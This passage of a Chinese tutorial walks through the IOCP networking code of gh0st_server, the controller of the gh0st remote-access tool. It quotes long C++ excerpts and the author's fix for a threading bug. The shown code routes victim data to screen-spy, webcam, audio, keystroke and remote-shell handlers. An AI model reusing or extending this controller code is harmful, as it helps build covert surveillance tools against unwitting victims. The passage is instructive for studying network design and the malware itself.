            InterlockedExchange((LPLONG)&(m_nRecvKbps), nBytes);
            nBytes = 0;
        }

        //////////////////////////////////////////////////////////////////////////

        if (dwIoSize == 0)
        {
            RemoveStaleClient(pContext, FALSE);
            return false;
        }

        if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
        {
            // 重新发送
            Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());
            // 必须再投递一个接收请求
            PostRecv(pContext);
            return true;
        }

        // Add the message to out message
        // Dont forget there could be a partial, 1, 1 or more + partial mesages
        pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer, dwIoSize);

        m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_RECEIVE);


        // Check real Data
        while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
        {
            BYTE bPacketFlag[FLAG_SIZE];
            CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

            if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
                throw "bad buffer";

            //nSize是包的总大小
            int nSize = 0;
            //CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
            CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(bPacketFlag));

            // Update Process Variable
            pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;

            if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
            {
                int nUnCompressLength = 0;
                // Read off header
                pContext->m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));

                pContext->m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
                pContext->m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));

                ////////////////////////////////////////////////////////
                ////////////////////////////////////////////////////////
                // SO you would process your data here
                // 
                // I'm just going to post message so we can see the data
                int	nCompressLength = nSize - HDR_SIZE;
                PBYTE pData = new BYTE[nCompressLength];
                PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

                if (pData == NULL || pDeCompressionData == NULL)
                    throw "bad Allocate";

                pContext->m_CompressionBuffer.Read(pData, nCompressLength);

                //////////////////////////////////////////////////////////////////////////
                unsigned long	destLen = nUnCompressLength;
                int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
                //////////////////////////////////////////////////////////////////////////
                if (nRet == Z_OK)
                {
                    pContext->m_DeCompressionBuffer.ClearBuffer();
                    pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
                    m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_RECEIVE_COMPLETE);
                }
                else
                {
                    throw "bad buffer";
                }

                delete[] pData;
                delete[] pDeCompressionData;
                pContext->m_nMsgIn++;
            }
            else
                break;
        }
        // Post to WSARecv Next
        PostRecv(pContext);
    }
    catch (...)
    {
        pContext->m_CompressionBuffer.ClearBuffer();
        // 要求重发，就发送0, 内核自动添加数包标志
        Send(pContext, NULL, 0);
        PostRecv(pContext);
    }

    return true;
}
```

上述代码中 **40** 行有一行调用：

```
m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_RECEIVE);
```

这是一个函数指针，在 **CMainFrame::Activate** 函数中初始化：

```
//MainFrm.cpp 330行
void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器
 	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{
        //...无关代码省略...
 	}
 	//...无关代码省略...
 }
```

上述第 **13** 行即初始化这个函数指针的代码：

```
//IOCPServer.cpp 124行
bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CMainFrame* pFrame, int nMaxConnections, int nPort)
{
    m_pNotifyProc = pNotifyProc;
    
    //...无关代码省略...
    
    return false;
}
```



这样网络线程中调用 **m_pNotifyProc** 实际上是调用的是 **CMainFrame::NotifyProc**，这个函数原始的代码是这样的：

```
//MainFrm.cpp 239行
void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
    //减少无效消息
    if (pContext == NULL || pContext->m_DeCompressionBuffer.GetBufferLen() <= 0)
        return;
       
    try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// 对g_pConnectView 进行初始化
		g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView还没创建，这情况不会发生
		if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;
		str.Format(_T("S: %.2f kb/s R: %.2f kb/s"), (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
        //g_pFrame->m_wndStatusBar.SetPaneText(1, str);


		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}
```



这样就出现了在网络线程（工作线程）中直接操作 UI 元素，这在 **CJ60Lib**  这个库中是不允许的，会导致程序崩溃。我作了如下修改：

1. 在 **CMainFrame::NotifyProc** 通过 **PostMessage** 产生一个 UI 更新事件 **WM_UPDATE_MAINFRAME** 发给 UI 线程（主线程），数据通过 **WM_UPDATE_MAINFRAME** 消息的 **WPARAM** 和 **LPARAM** 两个参数传递;

   ```
   void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
   {
       //减少无效消息
       if (pContext == NULL || pContext->m_DeCompressionBuffer.GetBufferLen() <= 0)
           return;
       
       CMainFrame* pFrame = (CMainFrame*)lpParam;
       pFrame->PostMessage(WM_UPDATE_MAINFRAME, (WPARAM)nCode, (LPARAM)pContext);
       //CJlib库不能在工作线程操作UI
       return;
       
       //使用return语句屏蔽无关的代码
   }
   ```


2. 为消息 WM_UPDATE_MAINFRAME 注册消息处理函数 **CMainFrame::NotifyProc2**;

   ```
   ON_MESSAGE(WM_UPDATE_MAINFRAME, NotifyProc2) 
   ```

3. 在 **CMainFrame::NotifyProc2** 根据消息携带的参数更新界面。

   ```
   LRESULT CMainFrame::NotifyProc2(WPARAM wParam, LPARAM lParam)
   {
       ClientContext* pContext = (ClientContext *)lParam;
       UINT nCode = (UINT)wParam;
   
       try
       {
           //CMainFrame* pFrame = (CMainFrame*)lpParam;
           CString str;
           // 对g_pConnectView 进行初始化
           g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;
   
           // g_pConnectView还没创建，这情况不会发生
           if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
               return 0;
   
           g_pConnectView->m_iocpServer = m_iocpServer;
           str.Format(_T("S: %.2f kb/s R: %.2f kb/s"), (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
           m_wndStatusBar.SetPaneText(1, str);
   
   
           switch (nCode)
           {
           case NC_CLIENT_CONNECT:
               break;
           case NC_CLIENT_DISCONNECT:
               g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
               break;
           case NC_TRANSMIT:
               break;
           case NC_RECEIVE:
               ProcessReceive(pContext);
               break;
           case NC_RECEIVE_COMPLETE:
               ProcessReceiveComplete(pContext);
               break;
           }
       }
       catch (...){}
   
       return 1;
   }
   ```



#### gh0st_server 网络通信框架分析

**gh0st_server** 是一个 MFC 程序，其有一个继承自 **CWinApp** 对象的程序实例对象 **CGh0stApp**，**CGh0stApp** 重写了 **CWinApp** 的 **InitInstance** 方法，在该方法中创建主窗口后，从配置文件 **gh0st_server.ini** 中读取侦听端口号（读不到会采用默认值 **8080**）后调用 **((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);**  做网络初始化工作：

  ```
//gh0st.cpp 125行
BOOL CGh0stApp::InitInstance()
{
	//...无关代码省略...
	
	// 启动IOCP服务器
	int	nPort = m_IniFile.GetInt(TEXT("Settings"), TEXT("ListenPort"));
    int	nMaxConnection = m_IniFile.GetInt(TEXT("Settings"), TEXT("MaxConnection"));
	if (nPort == 0)
		nPort = 8080;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	
    if (m_IniFile.GetInt(TEXT("Settings"), TEXT("MaxConnectionAuto")))
		nMaxConnection = 8000;

	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);

	return TRUE;
}
  ```

**CMainFrame::Activate** 函数中创建 **CIOCPServer** 堆对象（new 出来的），然后调用 **CIOCPServer::Initialize** 函数进行网络相关的初始化工作：

```
//IOCPServer.cpp 124行
bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CMainFrame* pFrame, int nMaxConnections, int nPort)
{
    m_pNotifyProc = pNotifyProc;
    m_pFrame = pFrame;
    m_nMaxConnections = nMaxConnections;
    m_socListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);


    if (m_socListen == INVALID_SOCKET)
    {
        TRACE(_T("Could not create listen socket %ld\n"), WSAGetLastError());
        return false;
    }

    // Event for handling Network IO
    m_hEvent = WSACreateEvent();

    if (m_hEvent == WSA_INVALID_EVENT)
    {
        TRACE(_T("WSACreateEvent() error %ld\n"), WSAGetLastError());
        closesocket(m_socListen);
        return false;
    }

    // The listener is ONLY interested in FD_ACCEPT
    // That is when a client connects to or IP/Port
    // Request async notification
    /*
    WSAEventSelect模型是WindowsSockets提供的一个有用异步I/O模型。
    该模型允许在一个或者多个套接字上接收以事件为基础的网络事件通知。
    Windows Sockets应用程序在创建套接字后，调用WSAEventSelect()函数，将一个事件对象与网络事件集合关联在一起。
    当网络事件发生时，应用程序以事件的形式接收网络事件通知。 　
    WSAEventSelect模型简单易用，也不需要窗口环境。
    该模型唯一的缺点是有最多等待64个事件对象的限制，当套接字连接数量增加时，就必须创建多个线程来处理I/O,也就是所谓的线程池。
    */
    int nRet = WSAEventSelect(m_socListen, m_hEvent, FD_ACCEPT);

    if (nRet == SOCKET_ERROR)
    {
        TRACE(_T("WSAAsyncSelect() error %ld\n"), WSAGetLastError());
        closesocket(m_socListen);
        return false;
    }

    SOCKADDR_IN		saServer;


    // Listen on our designated Port#
    saServer.sin_port = htons(nPort);

    // Fill in the rest of the address structure
    saServer.sin_family = AF_INET;
    saServer.sin_addr.s_addr = INADDR_ANY;

    // bind our name to the socket
    nRet = bind(m_socListen, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));

    if (nRet == SOCKET_ERROR)
    {
        DWORD dwErr = GetLastError();
        closesocket(m_socListen);
        return false;
    }

    // Set the socket to listen
    nRet = listen(m_socListen, SOMAXCONN);
    if (nRet == SOCKET_ERROR)
    {
        TRACE(_T("listen() error %ld\n"), WSAGetLastError());
        closesocket(m_socListen);
        return false;
    }


    ////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////
    UINT	dwThreadId = 0;

    m_hThread =
        (HANDLE)_beginthreadex(NULL,				// Security
        0,					// Stack size - use default
        ListenThreadProc,  // Thread fn entry point
        (void*) this,
        0,					// Init flag
        &dwThreadId);	// Thread address

    if (m_hThread != INVALID_HANDLE_VALUE)
    {
        InitializeIOCP();
        m_bInit = true;
        return true;
    }

    return false;
}
```

这些网络初始化步骤我们可以绘制成如下流程示意图：

![](http://www.hootina.org/github_easyserverdev/20181228203723.png)

与上一节介绍的完成端口中的对于接受连接的逻辑略有不用，**gh0st_server** 中专门新建了一个线程（线程函数 **ListenThreadProc** ）来处理新的连接，在这个线程函数中使用 Windows 的 **WSAEventSelect** 网络模型来检测新连接事件：

```
//IOCPServer.cpp 237行
unsigned CIOCPServer::ListenThreadProc(LPVOID lParam)
{
    CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(lParam);

    WSANETWORKEVENTS events;

    while (1)
    {
        //
        // Wait for something to happen
        //
        if (WaitForSingleObject(pThis->m_hKillEvent, 100) == WAIT_OBJECT_0)
            break;

        DWORD dwRet;
        dwRet = WSAWaitForMultipleEvents(1,
            &pThis->m_hEvent,
            FALSE,
            100,
            FALSE);

        if (dwRet == WSA_WAIT_TIMEOUT)
            continue;

        //
        // Figure out what happened
        //
        int nRet = WSAEnumNetworkEvents(pThis->m_socListen,
            pThis->m_hEvent,
            &events);

        if (nRet == SOCKET_ERROR)
        {
            TRACE(_T("WSAEnumNetworkEvents error %ld\n"), WSAGetLastError());
            break;
        }

        // Handle Network events //
        // ACCEPT
        if (events.lNetworkEvents & FD_ACCEPT)
        {
            if (events.iErrorCode[FD_ACCEPT_BIT] == 0)
                pThis->OnAccept();
            else
            {
                TRACE(_T("Unknown network event error %ld\n"), WSAGetLastError());
                break;
            }

        }

    } // while....

    return 0; // Normal Thread Exit Code...
}
```

当有新连接到来时，在 **pThis->OnAccept()** 中调用 socket **accept** 函数做实际的接受连接操作：

```
void CIOCPServer::OnAccept()
{
    m_listContexts.AssertValid();
    int g = m_listContexts.GetCount();


    SOCKADDR_IN	SockAddr;
    SOCKET		clientSocket;

    int			nRet;
    int			nLen;

    if (m_bTimeToKill || m_bDisconnectAll)
        return;

    //
    // accept the new socket descriptor
    //
    nLen = sizeof(SOCKADDR_IN);
    clientSocket = accept(m_socListen,
        (LPSOCKADDR)&SockAddr,
        &nLen);

    if (clientSocket == SOCKET_ERROR)
    {
        nRet = WSAGetLastError();
        if (nRet != WSAEWOULDBLOCK)
        {
            //
            // Just log the error and return
            //
            TRACE(_T("accept() error\n"), WSAGetLastError());
            return;
        }
    }

    // Create the Client context to be associted with the completion port
    ClientContext* pContext = AllocateContext();
    // AllocateContext fail
    if (pContext == NULL)
        return;

    pContext->m_Socket = clientSocket;

    // Fix up In Buffer
    pContext->m_wsaInBuffer.buf = (char*)pContext->m_byInBuffer;
    pContext->m_wsaInBuffer.len = sizeof(pContext->m_byInBuffer);

    // Associate the new socket with a completion port.
    if (!AssociateSocketWithCompletionPort(clientSocket, m_hCompletionPort, (DWORD)pContext))
    {
        delete pContext;
        pContext = NULL;

        closesocket(clientSocket);
        closesocket(m_socListen);
        return;
    }

    // 关闭nagle算法,以免影响性能，因为控制时控制端要发送很多数据量很小的数据包,要求马上发送
    // 暂不关闭，实验得知能网络整体性能有很大影响
    const char chOpt = 1;

    // 	int nErr = setsockopt(pContext->m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));
    // 	if (nErr == -1)
    // 	{
    // 		TRACE(_T("setsockopt() error\n"),WSAGetLastError());
    // 		return;
    // 	}

    // Set KeepAlive 开启保活机制
    if (setsockopt(pContext->m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) != 0)
    {
        TRACE(_T("setsockopt() error\n"), WSAGetLastError());
    }

    // 设置超时详细信息
    DWORD cbBytesReturned;
    tcp_keepalive	klive;
    klive.onoff = 1; // 启用保活
    klive.keepalivetime = m_nKeepLiveTime;
    klive.keepaliveinterval = 1000 * 10; // 重试间隔为10秒 Resend if No-Reply
    WSAIoctl
        (
        pContext->m_Socket,
        SIO_KEEPALIVE_VALS,
        &klive,
        sizeof(tcp_keepalive),
        NULL,
        0,
        //(unsigned long *)&chOpt,
        &cbBytesReturned,
        NULL,
        NULL
        );

    CLock cs(m_cs, "OnAccept");
    // Hold a reference to the context
    m_listContexts.AddTail(pContext);


    // Trigger first IO Completion Request
    // Otherwise the Worker thread will remain blocked waiting for GetQueuedCompletionStatus...
    // The first message that gets queued up is ClientIoInitializing - see ThreadPoolFunc and 
    // IO_MESSAGE_HANDLER


    OVERLAPPEDPLUS	*pOverlap = new OVERLAPPEDPLUS(IOInitialize);

    BOOL bSuccess = PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD)pContext, &pOverlap->m_ol);

    if ((!bSuccess && GetLastError() != ERROR_IO_PENDING))
    {
        RemoveStaleClient(pContext, TRUE);
        return;
    }


    m_pFrame->PostMessage(WM_WORKTHREAD_MSG, NC_CLIENT_CONNECT, (LPARAM)pContext);
    //m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_CLIENT_CONNECT);

    // Post to WSARecv Next
    PostRecv(pContext);
}
```

这个函数中的操作是完成端口模型的关键，我们梳理成如下流程图：

![](http://www.hootina.org/github_easyserverdev/20181228210041.png)

 

无论是投递的 **IOInitialize** 还是 **IORead** 事件都将交给完成端口的工作线程去处理，我们来看一下完成端口相关的工作线程的逻辑，我将不相关的代码简化去，保留主干代码：

```
//IOCPServer.cpp 550行
unsigned CIOCPServer::ThreadPoolFunc(LPVOID thisContext)
{
    // Get back our pointer to the class
    ULONG ulFlags = MSG_PARTIAL;
    CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(thisContext);
    ASSERT(pThis);

    HANDLE hCompletionPort = pThis->m_hCompletionPort;

    DWORD dwIoSize;
    LPOVERLAPPED lpOverlapped;
    ClientContext* lpClientContext;
    OVERLAPPEDPLUS*	pOverlapPlus;
    bool			bError;
    bool			bEnterRead;

    InterlockedIncrement(&pThis->m_nCurrentThreads);
    InterlockedIncrement(&pThis->m_nBusyThreads);

    //
    // Loop round and round servicing I/O completions.
    // 
    for (BOOL bStayInPool = TRUE; bStayInPool && pThis->m_bTimeToKill == false;)
    {
       //...无关代码省略...
       // Get a completed IO request.
       BOOL bIORet = GetQueuedCompletionStatus(hCompletionPort,
                                                &dwIoSize,
                                                (LPDWORD)&lpClientContext,
                                                &lpOverlapped, INFINITE);

       
       pOverlapPlus = CONTAINING_RECORD(lpOverlapped, OVERLAPPEDPLUS, m_ol);

       pThis->ProcessIOMessage(pOverlapPlus->m_ioType, lpClientContext, dwIoSize);
       //...无关代码省略...
    }
                
    return 0;
}
```

能看得出来 **lpOverlapped** 这个对象的作用吗？没错，就是我们前面介绍完成端口模型中说的**单 IO 数据**（**Per IO Data**），**lpClientContext** 就是**单句柄数据** （**Per Socket Data**）。然后根据事件的类型 **pOverlapPlus->m_ioType** 来进行实际的处理，**CIOCP::ProcessIOMessage** 的实现通过下面的宏拼凑出来的 if 语句：

```
BEGIN_IO_MSG_MAP()
    IO_MESSAGE_HANDLER(IORead, OnClientReading)
    IO_MESSAGE_HANDLER(IOWrite, OnClientWriting)
    IO_MESSAGE_HANDLER(IOInitialize, OnClientInitializing)
END_IO_MSG_MAP()
```

**CIOCPServer::OnClientInitializing** 实际什么也没做，我们这里就不贴它的代码了。

我们先来看下 **CIOCPServer::OnClientReading** 函数：

```
bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
{
    CLock cs(CIOCPServer::m_cs, "OnClientReading");
    try
    {
        //////////////////////////////////////////////////////////////////////////
        static DWORD nLastTick = GetTickCount();
        static DWORD nBytes = 0;
        nBytes += dwIoSize;

        if (GetTickCount() - nLastTick >= 1000)
        {
            nLastTick = GetTickCount();
            InterlockedExchange((LPLONG)&(m_nRecvKbps), nBytes);
            nBytes = 0;
        }

        //////////////////////////////////////////////////////////////////////////

        if (dwIoSize == 0)
        {
            RemoveStaleClient(pContext, FALSE);
            return false;
        }

        if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
        {
            // 重新发送
            Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());
            // 必须再投递一个接收请求
            PostRecv(pContext);
            return true;
        }

        // Add the message to out message
        // Dont forget there could be a partial, 1, 1 or more + partial mesages
        pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer, dwIoSize);

        m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_RECEIVE);


        // Check real Data
        while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
        {
            BYTE bPacketFlag[FLAG_SIZE];
            CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

            if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
                throw "bad buffer";

            //nSize是包的总大小
            int nSize = 0;
            //CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
            CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(bPacketFlag));

            // Update Process Variable
            pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;

            if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
            {
                int nUnCompressLength = 0;
                // Read off header
                pContext->m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));

                pContext->m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
                pContext->m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));

                ////////////////////////////////////////////////////////
                ////////////////////////////////////////////////////////
                // SO you would process your data here
                // 
                // I'm just going to post message so we can see the data
                int	nCompressLength = nSize - HDR_SIZE;
                PBYTE pData = new BYTE[nCompressLength];
                PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

                if (pData == NULL || pDeCompressionData == NULL)
                    throw "bad Allocate";

                pContext->m_CompressionBuffer.Read(pData, nCompressLength);

                //////////////////////////////////////////////////////////////////////////
                unsigned long	destLen = nUnCompressLength;
                int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
                //////////////////////////////////////////////////////////////////////////
                if (nRet == Z_OK)
                {
                    pContext->m_DeCompressionBuffer.ClearBuffer();
                    pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
                    m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_RECEIVE_COMPLETE);
                }
                else
                {
                    throw "bad buffer";
                }

                delete[] pData;
                delete[] pDeCompressionData;
                pContext->m_nMsgIn++;
            }
            else
                break;
        }
        // Post to WSARecv Next
        PostRecv(pContext);
    }
    catch (...)
    {
        pContext->m_CompressionBuffer.ClearBuffer();
        // 要求重发，就发送0, 内核自动添加数包标志
        Send(pContext, NULL, 0);
        PostRecv(pContext);
    }

    return true;
}
```



这段代码有几个地方需要注意一下：

1. 正如我们前面介绍完成端口模型所说的，当我们收到 **IORead** 事件时，我们的数据已经由系统帮我们处理好了，我们无需再调用 **recv** 之类的函数进行数据的收取，只要从**单 IO 数据**（这里实际上使用的是**单句柄数据**—— **pContext**）中把数据取出来处理就可以了。对于数据的解包操作，我们在上文 **gh0st_client** 源码分析中已经介绍过了，这里不再赘述。

2. 每用完一个 **IORead** 事件，为了下一次能继续收数据，我们需要补充一个，所以每次解完包，我们会调用 **PostRecv** 函数继续投递一个。

3.  在该处理函数的代码中第一行有一个加锁代码：

   ```
   CLock cs(CIOCPServer::m_cs, "OnClientReading");
   ```

   **CLock** 是利用 **RAII** 技术对 Windows **CriticalSection** 对象进行了简单的封装。那么你想过没有：这个锁用来保护什么资源呢？

   上述代码中还有这样一段：

   ```
   if (dwIoSize == 0)
   {
       RemoveStaleClient(pContext, FALSE);
       return false;
   }
   ```

   接收到的数据长度 **dwIoSize** 为 **0** 时表示对端关闭了连接，此时我们应该也关闭连接。这个时候**单句柄数据**（**pContext**）就无意义了。需要回收，由于这个对象是一个堆内存，**gh0st** 并没有将其直接销毁，而是将其从 **m_listContexts** 移动到 **m_listFreePool** 中，这两个对象的类型都是 ContextList，ContextList 是 基于 MFC 的 CList 定义的类型（CList 类似于 stl 的 std::list），以便于下次复用，这样一定程度上避免了反复的 new 和 delete 产生的内存碎片。

   ```
   typedef CList<ClientContext*, ClientContext*& > ContextList;
   ```

   由于多个线程可能会同时操作 **m_listContexts** 和 **m_listFreePool** ，所以这里使用了锁进行保护。但是，我在实际阅读 **RemoveStaleClient** 函数时，发现这个函数中已经加锁了：

   ```
   //IOCPServer.cpp 1129行
   void CIOCPServer::RemoveStaleClient(ClientContext* pContext, BOOL bGraceful)
   {
       CLock cs(m_cs, "RemoveStaleClient");
   
       //...其他代码省略...
   }
   ```

   所以，**完成端口工作线程中的加锁代码，笔者认为没有必要**，可能是 **gh0st** 作者疏忽了。

4. 当我们处理完某个数据包后，我们应答客户端调用 **CIOCPServer::Send** 方法，这个方法中一定是把应答数据包按协议格式组装后，然后向完成端口投递一个写事件（这里是 **IOWrite**）：

   ```
   //IOCPServer.cpp 767行
   void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)
   {
       if (pContext == NULL)
           return;
   
       try
       {
           if (nSize > 0)
           {
               // Compress data
               unsigned long	destLen = (double)nSize * 1.001 + 12;
               LPBYTE			pDest = new BYTE[destLen];
               int	nRet = compress(pDest, &destLen, lpData, nSize);
   
               if (nRet != Z_OK)
               {
                   delete[] pDest;
                   return;
               }
   
               //////////////////////////////////////////////////////////////////////////
               LONG nBufLen = destLen + HDR_SIZE;
               // 5 bytes packet flag
               pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
               // 4 byte header [Size of Entire Packet]
               pContext->m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
               // 4 byte header [Size of UnCompress Entire Packet]
               pContext->m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));
               // Write Data
               pContext->m_WriteBuffer.Write(pDest, destLen);
               delete[] pDest;
   
               // 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
               LPBYTE lpResendWriteBuffer = new BYTE[nSize];
               CopyMemory(lpResendWriteBuffer, lpData, nSize);
               pContext->m_ResendWriteBuffer.ClearBuffer();
               pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
               delete[] lpResendWriteBuffer;
           }
           else // 要求重发
           {
               pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
               pContext->m_ResendWriteBuffer.ClearBuffer();
               pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
           }
           // Wait for Data Ready signal to become available
           WaitForSingleObject(pContext->m_hWriteComplete, INFINITE);
   
           // Prepare Packet
           //	pContext->m_wsaOutBuffer.buf = (CHAR*) new BYTE[nSize];
           //	pContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();
   
           OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);
           PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD)pContext, &pOverlap->m_ol);
   
           pContext->m_nMsgOut++;
       }
       catch (...){}
   }
   ```

   数据重发的逻辑和 **gh0st_client** 中一样，这里也不再重复了。

解析得到一个业务数据后，通过调用：

```
 m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_RECEIVE_COMPLETE);
```

来交给 UI 线程（具体逻辑这在前面**笔者修正的 bug** 那一段已经介绍过了）：

```
//MainFrm.cpp 287行
LRESULT CMainFrame::NotifyProc2(WPARAM wParam, LPARAM lParam)
{
    ClientContext* pContext = (ClientContext *)lParam;
    UINT nCode = (UINT)wParam;

    try
    {
        //CMainFrame* pFrame = (CMainFrame*)lpParam;
        CString str;
        // 对g_pConnectView 进行初始化
        g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

        // g_pConnectView还没创建，这情况不会发生
        if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
            return 0;

        g_pConnectView->m_iocpServer = m_iocpServer;
        str.Format(_T("S: %.2f kb/s R: %.2f kb/s"), (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
        m_wndStatusBar.SetPaneText(1, str);


        switch (nCode)
        {
        case NC_CLIENT_CONNECT:
            break;
        case NC_CLIENT_DISCONNECT:
            g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
            break;
        case NC_TRANSMIT:
            break;
        case NC_RECEIVE:
            ProcessReceive(pContext);
            break;
        case NC_RECEIVE_COMPLETE:
            ProcessReceiveComplete(pContext);
            break;
        }
    }
    catch (...){}

    return 1;
}
```

对于 **NC_RECEIVE_COMPLETE** 的处理逻辑实际上是调用 **ProcessReceiveComplete** 函数：

```
void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}
    BYTE b = pContext->m_DeCompressionBuffer.GetBuffer(0)[0];
	switch (b)
	{
	case TOKEN_AUTH: // 要求验证
		{
			AfxMessageBox(_T("要求验证1"));
